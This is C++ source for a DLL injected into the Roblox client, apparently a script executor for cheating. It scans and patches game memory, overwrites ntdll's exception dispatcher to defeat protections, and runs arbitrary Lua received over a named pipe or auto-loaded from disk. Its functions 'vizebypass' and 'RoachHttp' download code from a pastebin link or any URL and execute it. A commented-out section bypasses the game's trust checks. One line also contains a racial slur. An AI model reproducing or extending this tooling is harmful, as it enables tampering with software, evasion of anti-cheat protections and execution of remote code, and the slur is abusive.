// Roach.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include <string>
#include <iostream>
#include <stdlib.h>
#include <vector>
#include <iterator>
#include <fstream>
#include <intrin.h>
#include <Tlhelp32.h>
#include <CommCtrl.h>
#include <Wininet.h>
#include <functional>
#include "Scan.h"
#include "Convert.h"
#include "ElyForm.h"
#pragma comment(lib, "wininet.lib")
using namespace std;


DWORD ScriptContext;
//DWORD ScriptContextVFTable = x(0x13A20F8);

DWORD oldgrabGlobalStateIndex(DWORD ScriptContext, int idx)
{
	DWORD* context = reinterpret_cast<DWORD*>(ScriptContext);
	return context[idx] + (DWORD)&context[idx];
}



using Convert::c_rL;
using Convert::c_L;
void PushGlobal(DWORD rL, lua_State* L, const char* s)
{
	r_lua_getglobal(rL, s);
	Convert::push(rL, L, -1);
	lua_setglobal(L, s);
	r_lua_pop(rL, 1);
}
string WholeScript = "";
DWORD RLL;
struct args {
	DWORD rL;
	char* buf;
	std::function<void()> fat;
};
std::string hax;
std::string buffauto;
void threadstuff() {
	__try {
		    
		    
			luaL_dostring(c_L, WholeScript.c_str());
			WholeScript = "";
	}
	__except (EXCEPTION_EXECUTE_FAULT) {
		lua_pop(c_L, -1);
		WholeScript = "";
		Sleep(55);
	}
}

/*

trust check is removed

#define getcheck x(0x5BA40B)
#define trustcheck x(0x600963)

void BypassHttpGetChecksExecute(lua_State *L, std::string hold) {
	WriteProcessMemory(GetCurrentProcess(), reinterpret_cast<void*>(getcheck), "\xEB", 1, 0);//Set opcode to jmp xC3
	WriteProcessMemory(GetCurrentProcess(), reinterpret_cast<void*>(trustcheck), "\xEB", 1, 0);//Set opcode to near return
	luaL_dostring(L, hold.c_str()); //Call luaL_dostring to execute the Line supplied in the hold argument
	WriteProcessMemory(GetCurrentProcess(), reinterpret_cast<void*>(trustcheck), "\x75", 1, 0);// Set The opcodes back (jnz) before memcheck fucks us 
	WriteProcessMemory(GetCurrentProcess(), reinterpret_cast<void*>(getcheck), "\x74", 1, 0);// Set The opcodes back (jz) before memcheck fucks us 
}


int trustfuck(lua_State *L) {
	WriteProcessMemory(GetCurrentProcess(), reinterpret_cast<void*>trustcheck, "\xEB", 1, 0);
	return 0;
}
 
int trustunfuck(lua_State *L) {
	WriteProcessMemory(GetCurrentProcess(), reinterpret_cast<void*>trustcheck, "\x75", 1, 0); 
	return 0;
}

int c_httpget(lua_State *L) {
	auto url = "nil"; // Default the url argument to nil incase an argument isnt provided.
	if (lua_tostring(L, -1) != LUA_TNIL) {// Checking to see if the url argument is provided before setting the url variable else, it would cause roblox to crash.
		url = lua_tostring(L, -1); // setting the url variable to the url argument at the given index.
	}
	else if (lua_tostring(L, -2) != LUA_TNIL) {// If the index -1 was nil then it means there was no argument supplied or a second argument was supplied.
		url = lua_tostring(L, -2); // Httpget had a second boolean argument that decided if the function would be asynchronous or not.
		//If this argument was passed, even though it doesnt affect httpgetasync, it would be pushed to the top of the vanilla lua stack, therefore the url argument would be supllied at the index -2.
	}
	auto hold = std::string("return game:HttpGetAsync('") + std::string(url) + std::string("')"); // preparing the actual function to be called
	BypassHttpGetChecksExecute(L, hold); //Bypassing all checks and executing
	return 1;
}

*/
int mouse1press_impl(lua_State *L) {
	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
	SendInput(1, &input, sizeof(input));
	return 0;
}


std::string DownloadURL(const char* URL) {
	HINTERNET interwebs = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
	HINTERNET urlFile;
	std::string rtn;
	if (interwebs) {
		urlFile = InternetOpenUrl(interwebs, URL, NULL, NULL, NULL, NULL);
		if (urlFile) {
			char buffer[2000];
			DWORD bytesRead;
			do {
				InternetReadFile(urlFile, buffer, 2000, &bytesRead);
				rtn.append(buffer, bytesRead);
				memset(buffer, 0, 2000);
			} while (bytesRead);
			InternetCloseHandle(interwebs);
			InternetCloseHandle(urlFile);
			return rtn;
		}
	}
	InternetCloseHandle(interwebs);
	return rtn;
}
int RoachHttp(lua_State *L) {
		const char* str = lua_tostring(L, 1);

		string Response = DownloadURL(str);

		luaL_dostring(L,Response.c_str());
		return 0;
}

int vizebypass(lua_State *L) {
	//const char* str = lua_tostring(L, 1);

	string Response = DownloadURL("https://pastebin.com/raw/KtFs2AYY");

	luaL_dostring(L, Response.c_str());
	return 0;
}

int EnvAddress(lua_State *L) {

	luaL_dostring(L, "_G.Nigger = true");

	return 0;
}


//

DWORD WINAPI input(PVOID lvpParameter)
{

	HANDLE hPipe;
	char buffer[999999];
	DWORD dwRead;
	hPipe = CreateNamedPipe(TEXT("\\\\.\\pipe\\Roach"),
		PIPE_ACCESS_DUPLEX | PIPE_TYPE_BYTE | PIPE_READMODE_BYTE,
		PIPE_WAIT,
		1,
		999999,
		999999,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);
	while (hPipe != INVALID_HANDLE_VALUE)
	{
		if (ConnectNamedPipe(hPipe, NULL) != FALSE)
		{
			while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) != FALSE)
			{
				buffer[dwRead] = '\0';
				try {
					try {
						WholeScript = WholeScript + buffer;
					}
					catch (...) {
					}
				}
				catch (std::exception e) {

				}
				catch (...) {

				}
			}
			
			//buff = "spawn(function() script = Instance.new'LocalScript' script.Disabled = true script.Name = math.random(10, 100000 / 100) script.Parent = nil\r\n";
			//buff += WholeScript;
			//buff += "\r\nend)";
			CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)threadstuff, NULL, NULL, NULL);
			//if (luaL_loadstring(c_L, WholeScript.c_str()))
			//	printf("Error: %s\n", lua_tostring(c_L, -1));
		//	else
		//		lua_pcall(c_L, 0, 0, 0);
			//}
		
			//else {
				//try{
				//lua_pcall(c_L, 0, 0, 0);
				//}
				//catch (int e) {
				//}
			//}
		}
		DisconnectNamedPipe(hPipe);
	}
}

int getrawmeta(lua_State *L) {
	Convert::push(L, c_rL, 1);

	if (r_lua_getmetatable(c_rL, -1) == 0) {
		lua_pushnil(L);
		return 0;
	}
	Convert::push(c_rL, L, -1);

	return 1;
}

int mouse1release_impl(lua_State *L) {
	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
	SendInput(1, &input, sizeof(input));
	return 0;
}

static int UDGC(lua_State *Thread) {
	void *UD = lua_touserdata(Thread, 1);
	if (c_rL) {
		r_lua_rawgeti(c_rL, LUA_REGISTRYINDEX, (int)UD);
		if (r_lua_type(c_rL, -1) <= R_LUA_TNIL) {
			lua_pushnil(Thread);
			lua_rawseti(Thread, LUA_REGISTRYINDEX, (int)UD);
		}
	}
	return 0;
}
int mouse2press_impl(lua_State *L) {
	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
	SendInput(1, &input, sizeof(input));
	return 0;
}

int mouse2release_impl(lua_State *L) {
	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
	SendInput(1, &input, sizeof(input));
	return 0;
}

int mouse2click_impl(lua_State *L) {
	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP;
	SendInput(1, &input, sizeof(input));
	return 0;
}

int mouse1click_impl(lua_State *L) {
	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
	SendInput(1, &input, sizeof(input));
	return 0;
}

int Copy2Clipboard(lua_State *L)
{
	char* str = r_lua_tolstring(c_rL, -1, NULL);
	if (!str)
	{
		return 0;
	}

	int len = strlen(str);
	HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len + 1);
	void *mem_ptr = GlobalLock(hMem);
	memcpy(mem_ptr, str, len + 1);
	GlobalUnlock(hMem);
	OpenClipboard(NULL);
	EmptyClipboard();
	SetClipboardData(CF_TEXT, hMem);
	CloseClipboard();
	return 0;
}

int setreadonly(lua_State *L) {

	// TODO Check stack & set read only
	if (r_lua_gettop(c_rL) < 1) {
		r_lua_pushnil(c_rL);
		r_lua_pushstring(c_rL, "1 or more arguments expected");
		return 2;
	}
	else if (r_lua_gettop(c_rL) != 7) {
		r_lua_pushnil(c_rL);
		r_lua_pushstring(c_rL, "table expected");
		return 2;
	}
	else {
		r_lua_pushnil(c_rL);
		return 1;
	}
}


int loadfile(lua_State *L)
{

	char *filename;
	int err = 0;
	if (r_lua_gettop(c_rL) == 1 && (filename = r_lua_tolstring(c_rL, -1, NULL)))
	{
		err = luaL_loadfile(L, filename);
		if (!err)
		{
			lua_pop(L, 1);
			return 1;
		}
	}

	r_lua_pushnil(c_rL);
	r_lua_pushstring(c_rL, "Invalid arguments to loadfile. Usage: loadfile(string filename)");
	return 2;
}

int isreadonly(lua_State *L) {

	// TODO Check stack for if table is read only
	if (r_lua_gettop(c_rL) < 1) {
		r_lua_pushnil(c_rL);
		r_lua_pushstring(c_rL, "1 or more arguments expected");
		return 2;
	}
	else if (r_lua_gettop(c_rL) != 7) {
		r_lua_pushnil(c_rL);
		r_lua_pushstring(c_rL, "table expected");
		return 2;
	}
	else {
		r_lua_pushnil(c_rL);
		return 1;
	}
}

void VEH_Bypass() {
	HMODULE mod = GetModuleHandleA("ntdll.dll");
	DWORD old;
	DWORD KIException = cast(DWORD, GetProcAddress(mod, "KiUserExceptionDispatcher"));
	VirtualProtect((LPVOID)KIException, 1, PAGE_EXECUTE_READWRITE, &old);
	for (int i = 0; i < 24; i++) {
		*(char*)(KIException + i) = 0x90;
	}
	VirtualProtect((LPVOID)KIException, 1, old, &old);
}



std::vector<string> str_split(string str, char delimiter)
{
	std::vector<string> tokens;
	std::stringstream ss(str);
	std::string tok;

	while (getline(ss, tok, delimiter))
		tokens.push_back(tok);

	return tokens;
}
string AutoExec;
void load_autoexec_scripts()
{
	WIN32_FIND_DATA fd;
	HANDLE hFile = FindFirstFile(AutoExec.c_str(), &fd);
	if (hFile == INVALID_HANDLE_VALUE)
		return;

	do
	{
		string path = AutoExec;
		path.resize(path.find_last_of('\\') + 1);
		path += fd.cFileName;
		if (_stricmp(fd.cFileName + strlen(fd.cFileName) - 4, ".lua") != 0)
			continue;

		std::ifstream file;
		file.open(path.c_str(), std::ifstream::binary);
		if (!file.is_open())
		{
			continue;
		}

		file.seekg(0, file.end);
		int size = (int)file.tellg();
		file.seekg(0, file.beg);
		char *filestr = new char[size + 1]();
		file.read(filestr, size);
		file.seekg(0, file.beg);
		file.close();
		buffauto = "spawn(function() script = Instance.new'LocalScript' script.Disabled = true script.Name = math.random(10, 100000 / 100) script.Parent = nil\r\n";
		buffauto += filestr;
		buffauto += "\r\nend)";
		luaL_dostring(c_L, buffauto.c_str());
		delete[] filestr;
	} while (FindNextFile(hFile, &fd));
}

int bypasslua(lua_State *L) {
	const char* strx = lua_tostring(L, 1);
	std::string haxd;
	haxd = "spawn(function() script = Instance.new'LocalScript' script.Disabled = true script.Name = math.random(10, 100000 / 100) script.Parent = nil\r\n";
	haxd += strx;
	haxd += "\r\nend)";
	luaL_dostring(L, haxd.c_str());
	return 0;
}

int fuckinginternalui(lua_State *L) {
	try {
		form->Start("Roach", "ry4y36", "Roach.dll");
		return 0;
	}
	catch (std::exception e) {
		//HackExit(e.what());
	}
	return 0;
}
//extern lua_State *nibb;
void main()
{
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)input, NULL, NULL, NULL);
	DWORD ScriptContextVFTable = *(DWORD*)((aobscan::scan("\xC7\x07\x00\x00\x00\x00\xC7\x47\x00\x00\x00\x00\x00\x8B\x87", "xx????xx?????xx")) + 0x02); 
    DWORD ScriptContext = MemScan::Scan(PAGE_READWRITE, (char*)&ScriptContextVFTable, (char*)"xxxx");
	
	//
	char cpath[MAX_PATH];
	std::ifstream file;
	HMODULE hDll;
	GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCSTR)str_split, &hDll);
	GetModuleFileName(hDll, cpath, MAX_PATH);
	string path = cpath;
	int index = path.find_last_of('\\');
	path.resize(index);
	string g_install_path = path + '\\';
	AutoExec = path;
	AutoExec += "\\autoexec\\*";

	if (!ScriptContext)
	{
		MessageBoxA(NULL, "Script Context FAILED", "Error", MB_OK);
	}
	c_rL = ScriptContext + 56 * 1 + 164 + *(DWORD *)ScriptContext + 56 * 1 + 164;
		
		//hookStateIndex(ScriptContext, 164);
	
	
	if (!c_rL)
	{
		MessageBoxA(NULL, "LUA STATE FAILED", "Error", MB_OK);
	}


    VEH_Bypass();
	c_L = luaL_newstate();
	
	//*(DWORD*)x(0x1B6DF3C) = 6;
	
	Convert::VehHandlerpush();
	luaL_openlibs(c_L);
	luaL_newmetatable(c_L, "garbagecollector");
	lua_pushcfunction(c_L, UDGC);
	lua_setfield(c_L, -2, "__gc");
	lua_pushvalue(c_L, -1);
	lua_setfield(c_L, -2, "__index");
	PushGlobal(c_rL, c_L, "printidentity");
	PushGlobal(c_rL, c_L, "game");
	PushGlobal(c_rL, c_L, "Game");
	PushGlobal(c_rL, c_L, "workspace");
	PushGlobal(c_rL, c_L, "Workspace");
	PushGlobal(c_rL, c_L, "Axes");
	PushGlobal(c_rL, c_L, "BrickColor");
	PushGlobal(c_rL, c_L, "CFrame");
	PushGlobal(c_rL, c_L, "Color3");
	PushGlobal(c_rL, c_L, "ColorSequence");
	PushGlobal(c_rL, c_L, "ColorSequenceKeypoint");
	PushGlobal(c_rL, c_L, "NumberRange");
	PushGlobal(c_rL, c_L, "NumberSequence");
	PushGlobal(c_rL, c_L, "NumberSequenceKeypoint");
	PushGlobal(c_rL, c_L, "PhysicalProperties");
	PushGlobal(c_rL, c_L, "Ray");
	PushGlobal(c_rL, c_L, "Rect");
	PushGlobal(c_rL, c_L, "Region3");
	PushGlobal(c_rL, c_L, "Region3int16");
	PushGlobal(c_rL, c_L, "TweenInfo");
	PushGlobal(c_rL, c_L, "UDim");
	PushGlobal(c_rL, c_L, "UDim2");
	PushGlobal(c_rL, c_L, "Vector2");
	PushGlobal(c_rL, c_L, "Vector2int16");
	PushGlobal(c_rL, c_L, "Vector3");
	PushGlobal(c_rL, c_L, "Vector3int16");
	PushGlobal(c_rL, c_L, "Enum");
	PushGlobal(c_rL, c_L, "Faces");
	PushGlobal(c_rL, c_L, "Instance");
	PushGlobal(c_rL, c_L, "math");
	PushGlobal(c_rL, c_L, "warn");
	PushGlobal(c_rL, c_L, "typeof");
	PushGlobal(c_rL, c_L, "type");
	PushGlobal(c_rL, c_L, "spawn");
	PushGlobal(c_rL, c_L, "Spawn");
	PushGlobal(c_rL, c_L, "print");
	PushGlobal(c_rL, c_L, "ypcall");
	PushGlobal(c_rL, c_L, "while");
	PushGlobal(c_rL, c_L, "Wait");
	PushGlobal(c_rL, c_L, "wait");
	PushGlobal(c_rL, c_L, "delay");
	PushGlobal(c_rL, c_L, "Delay");
	PushGlobal(c_rL, c_L, "tick");
	PushGlobal(c_rL, c_L, "LoadLibrary");
	lua_register(c_L, "getrawmetatable", getrawmeta);
	lua_register(c_L, "isreadonly", isreadonly);
	lua_register(c_L, "setreadonly", setreadonly);
	lua_register(c_L, "toclipboard", Copy2Clipboard);
	lua_register(c_L, "loadfile", loadfile);
	lua_register(c_L, "RoachHttp", RoachHttp);
	lua_register(c_L, "mouse1press", mouse1press_impl);
	lua_register(c_L, "mouse1release", mouse1release_impl);
	lua_register(c_L, "mouse2press", mouse2press_impl);
	lua_register(c_L, "mouse2release", mouse2release_impl);
	lua_register(c_L, "internaluielysian", fuckinginternalui);
	lua_register(c_L, "stealthlua", bypasslua);
	lua_newtable(c_L);
	lua_setglobal(c_L, "_G");
	load_autoexec_scripts();
	
	
}